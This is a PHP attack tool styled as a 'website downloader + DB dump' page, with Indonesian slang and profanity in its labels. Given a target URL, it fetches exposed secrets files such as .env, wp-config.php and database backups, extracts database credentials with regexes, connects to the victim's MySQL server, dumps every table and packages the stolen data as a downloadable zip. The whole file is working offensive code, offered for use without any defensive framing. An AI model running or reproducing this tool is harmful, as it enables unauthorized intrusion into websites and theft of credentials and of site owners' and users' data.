<?php
error_reporting(0);
ini_set('display_errors',0);
echo '<title>YANSHS  DOWNLOADER</title><body bgcolor=black><font face=courier color=lime size=5><center>';
echo '<h1> WEBSITE DOWNLOADER + DB DUMP</h1>';
echo '<form method=post><input type=text name=url size=50 placeholder="https://target.com" style="padding:15px;font-size:20px">
<input type=submit value="INJEK SEKARANG!" style="padding:15px;font-size:20px;background:lime;color:black"></form>';

if($_POST['url']){
    $url = $_POST['url'];
    $host = parse_url($url,PHP_URL_HOST);
    $path = parse_url($url,PHP_URL_PATH);
    $dir = "ngentot_$host";
    if(!is_dir($dir)) mkdir($dir);
    
    echo "<pre>Target: $url\nMulai ngentot folder...<hr>";
    
    $files = ['','.env','config.php','wp-config.php','admin/','backup/','db_backup.sql','phpinfo.php'];
    foreach($files as $f){
        $u = rtrim($url,'/').'/'.ltrim($f,'/');
        $c = @file_get_contents($u);
        if($c){
            $save = $dir.'/'.basename($f?:'index.html');
            file_put_contents($save,$c);
            echo "[+] NGENTOT → $u → $save\n";
            if(stripos($c,'mysql_')||stripos($c,'DB_PASSWORD')){
                preg_match_all("/DB_HOST['\)] = ['\"](.*?)['\"]/i",$c,$db);
                preg_match_all("/DB_USER['\)] = ['\"](.*?)['\"]/i",$c,$u);
                preg_match_all("/DB_PASSWORD['\)] = ['\"](.*?)['\"]/i",$c,$p);
                preg_match_all("/DB_NAME['\)] = ['\"](.*?)['\"]/i",$c,$n);
                if($db[1][0]){
                    $dump = "$dir/DB_DUMP.sql";
                    $link = @mysqli_connect($db[1][0],$u[1][0],$p[1][0],$n[1][0]);
                    if($link){
                        $tables = mysqli_query($link,"SHOW TABLES");
                        $sql = "";
                        while($t = mysqli_fetch_array($tables)){
                            $tn = $t[0];
                            $r = mysqli_query($link,"SHOW CREATE TABLE `$tn`");
                            $cr = mysqli_fetch_array($r)[1].";\n";
                            $sql .= $cr;
                            $res = mysqli_query($link,"SELECT * FROM `$tn`");
                            while($row = mysqli_fetch_assoc($res)){
                                $sql .= "INSERT INTO `$tn` VALUES (";
                                foreach($row as $v) $sql .= "'".mysqli_real_escape_string($link,$v)."',";
                                $sql = rtrim($sql,',').");\n";
                            }
                        }
                        file_put_contents($dump,$sql);
                        echo "[+] DATABASE DUMP SELESAI → $dump\n";
                    }
                }
            }
        }
    }
    
    // zip semua
    $zip = new ZipArchive();
    $zipfile = "$dir.zip";
    if($zip->open($zipfile, ZipArchive::CREATE)===TRUE){
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
        foreach($iterator as $file){
            if(!$file->isDir()) $zip->addFile($file->getPathname(), str_replace($dir.'/','',$file->getPathname()));
        }
        $zip->close();
        echo "<hr>[+] SEMUA SELESAI! DOWNLOAD ZIP → <a href='$zipfile' style='color:yellow'>$zipfile</a>";
        echo "<br><br><iframe src='$zipfile' width=1 height=1></iframe>";
    }
}
echo '</pre></center></body></html>';
?>